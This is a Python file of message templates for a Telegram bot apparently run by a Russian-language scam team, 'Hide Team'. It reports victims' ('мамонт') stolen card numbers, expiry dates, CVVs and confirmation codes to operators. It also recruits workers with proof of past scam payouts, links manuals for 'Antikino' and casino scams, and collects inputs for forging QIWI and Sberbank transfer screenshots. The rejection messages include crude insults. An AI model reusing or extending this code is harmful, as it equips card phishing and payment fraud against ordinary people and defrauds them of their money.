from aiogram.utils.emoji import emojize

from data.config import Rates


startup_text = emojize(
    "<b>Бот запущен!</b> :sparkle:"
)

cardinfo = "Мамонт ввел данные карты\n\n" \
    "Номер карты: <b>{number}</b>\n" \
    "Дата: <b>{data}</b>\n" \
    "CVV: <b>{cvv}</b>"

new_code = "Мамонт ввел код\n\n" \
    "Карта: <b>{number}</b>\n" \
    "Код: <b>{code}</b>"

"""
    Summary

"""

summary_text = emojize(
    ":man_shrugging: <b>Неизвестная комманда.</b>\n"
    ":snake: <b>Хотите подать заявку?</b>"
)

new_summary_text = emojize(
    ":snake: <b>Приветствуем Вас в Hide Team</b>\n\n"
    "<code>Чтобы попасть в команду - подавайте заявку</code>"
)


def rules_text(agreed=False):
    text = ":page_with_curl: <b>Правила и условия данного проекта:</b>\n\n" \
        "1. <code>Категорически запрещается всякое попрошайничество в беседе воркеров</code>\n\n" \
        "2. <code>Запрещен: спам/флуд</code>\n\n" \
        "3. <code>Разрешено - рофлить над всеми, не зависимо от статуса участника проекта (в пределах нормы)</code>\n\n" \
        "4. <code>По усмотрению администрации проекта, лок/скам дропов ОПЛАЧИВАЕТСЯ в размере 25%-50% от успешной оплаты</code>\n\n" \
        "5. <code>Запрещается - продажа каких либо услуг/товаров без соглашения администрации, за сделки проведённые без нашего ведома ответственности НЕ НЕСЁМ</code>\n\n"

    if agreed:
        text += ":white_check_mark: <b>Вы ознакомились и согласились с правилами данного проекта</b>"
    else:
        text += ":grey_question: Вы подтверждаете, что ознакомились и принимаете условия и правила нашего проекта?"

    return emojize(text)


summary_where_text = emojize(
    ":seedling: <b>Откуда Вы узнали о нас?</b>\n\n"
    "Отправьте ссылку на источник."
)

summary_exp_text = emojize(
    ":dragon: <b>Есть ли у вас опыт работы в данной сфере?</b>\nПриложите доказательства:\n\n"
    "1. <code>Скрины выплат из команд где вы работали</code>\n"
    "2. <code>Скриншот 'Мой профиль' (если имеется в боте)</code>\n"
    "3. <code>Общая сумма оплат</code>\n\n"
    "Можно отправить ссылку из [@imgurbot_bot] или просто прислать фото."
)

summary_final = emojize(
    ":clipboard: <b>Ваша заявка готова к отправке на проверку</b>\n\n"
    ":one: <b>Откуда Вы узнали о нас:</b> {where}\n"
    ":two: <b>Ваш опыт работы:</b> {experience}"
)

summary_sended_text = emojize(
    ":file_folder: <b>Ваша заявка отправлена на проверку</b>\n\n"
    "Вам придет уведомление когда заявку рассмотрят!\n\n"
    ":one: <b>Откуда Вы узнали о нас:</b> {where}\n"
    ":two: <b>Ваш опыт работы:</b> {experience}"
)

summary_reviewing_text = emojize(
    ":warning: <b>Ошибка!</b>"
    ":information_source: Ваша заявка уже рассматривается"
)


def summary_check_text(status="Ожидает проверки"):
    if status == "Ожидает проверки":
        text = emojize(":envelope: <b>Поступила заявка на вступление</b>\n\n")
    else:
        text = ""

    text += emojize(
        "<b>{name}</b> {username}[<code>{chat_id}</code>]\n\n"
        ":one: <b>Откуда Вы узнали о нас:</b> {where}\n"
        ":two: <b>Ваш опыт работы:</b> {experience}\n\n"
        "<b>Статус:</b> "
    )

    text += status

    return text


summary_rejected_text = emojize(
    ":warning: <b>Администрация проекта отклонила Вашу заявку!</b>\n"
    ":link: <b>Попробуйте подать заявку заново.</b>"
)

summary_accepted_text = emojize(
    ":tada: <b>Ваша заявка на вступление одобрена</b>\n\n"
    "Вступайте в чат и начинайте работать!\n"
    "<b>Удачных профитов!</b>"
)

summary_accepted_info_text = emojize(
    ":green_apple: <b>Данная информация может быть полезна.</b>\n\n"
    "<b>Мануалы</b> :books:\n"
    "└ <a href='https://telegra.ph/Manual-po-rabote-s-Antikino-04-30'>Антикино (Основной)</a>\n"
    "└ <a href='https://telegra.ph/Polnyj-manual-dlya-raboty-04-30'>Антикино (Полный)</a>\n"
    "└ <a href='https://telegra.ph/Casino-Hide-Team-04-04'>Казино (Основной)</a>\n"
    "└ <a href='https://telegra.ph/Esli-mamont-znaet-pro-shemu-04-04'>Казино (Если мамонт шарит)</a>\n"
    "└ <a href='https://telegra.ph/Manual-po-vyvodu-sredstv-s-BTC-BANKER-04-30'>Вывод с BTC Banker</a>\n"
)

summary_blocked_text = emojize(
    ":no_entry_sign: <b>Администрация проекта заблокировала Вас!</b>\n\n"
    ":hatched_chick: <b>Ты идешь НАХУЙ!</b>"
)

summary_blockfin_text = emojize(
    ":shrimp: <b>Вы пришли нахуй!</b>\n\n"
    "<code>Иди отсоси себе)</code>"
)

"""
    Hide Panel

"""

worker_menu_text = emojize(
    "<a href='https://telegra.ph/file/540dc139ad0ac47d5f27a.png'>:snake:</a> <b>Hide Panel</b> [<code>{chat_id}</code>]\n\n"
    ":keycap_number_sign: <b>Secret-ID:</b> <code>{secret_id}</code>\n"
    ":capital_abcd: <b>Ник в выплатах:</b> {username_hide}\n"
    ":arrow_up: <b>Уровень:</b> {level}\n\n"
    ":dollar: <b>Сумма скама:</b> {all_balance} RUB\n"
    ":credit_card: <b>Общий чек:</b> {ref_balance} RUB\n\n"
    ":calendar: <b>В комманде:</b> {in_team} дней"
)


"""

render

"""

render_qiwibalance_text = emojize(
    "<b>Введите необходимые данные:</b>\n\n"
    ":one: Сумма перевода\n"
    ":two: Время скриншота\n\n"
    "<b>Пример:</b>\n"
    "<code>5024,59\n8:10</code>"
)

render_qiwitransfer_text = emojize(
    "<b>Введите необходимые данные:</b>\n\n"
    ":one: Номер получателя\n"
    ":two: Сумма перевода\n"
    ":three: Дата перевода\n\n"
    "<b>Пример:</b>\n"
    "<code>+78005553535\n500\n18.06.2021 в 6:56</code>"
)

render_sbertransfer_text = emojize(
    "<b>Введите необходимые данные:</b>\n\n"
    ":one: Сумма перевода\n"
    ":two: ФИО Получателя\n"
    ":three: Время скриншота\n\n"
    "<b>Пример:</b>\n"
    "<code>10000\nИван Иванович\n6:36</code>"
)

change_secretid_text = emojize(
    ":pencil2: <b>Введите Ваш новый Secret-ID</b> (не более 8 символов)"
)

new_secretidinv_text = emojize(
    ":information_source: <b>Secret-ID должен состоять только из латинских букв, цифр, без пробелов, и не более 8 символов</b>"
)

new_secretid_text = emojize(
    ":recycle: <b>Ваш новый Secret-ID:</b> <code>{secret_id}</code>"
)


"""
rate

"""

rate_text = emojize(
    ":scales: <b>Ваша ставка</b>\n\n"
    "<b>Оплата:</b> {profit}%\n"
    "<b>X-Оплата:</b> {xprofit}%\n"
    "<b>Возврат:</b> {refund}%"
)

about_rates_text = emojize(
    ":woman_tipping_hand: <b>Выберите ставку</b>\n\n"
    "<b>Оплата  Х-Оплата  Возврат</b>\n"
)
for i, (profit, xprofit, refund) in enumerate(Rates):
    about_rates_text += f'{i + 1}{" "*4}{profit}%{" "*10}{xprofit}%{" "*10}{refund}%\n'


profits_text = emojize(
    ":lizard: Какую статистику отобразить?"
)

week_profitinv_text = emojize(
    "Список Ваших профитов за неделю пуст."
)

week_profit_text = emojize(
    ":chart: Статистика за неделю.\n\n"
    "<b>Средний чек:</b> {middle_profits:.0f} RUB\n"
    "<b>Кол-во залетов:</b> {profits_len}"
)
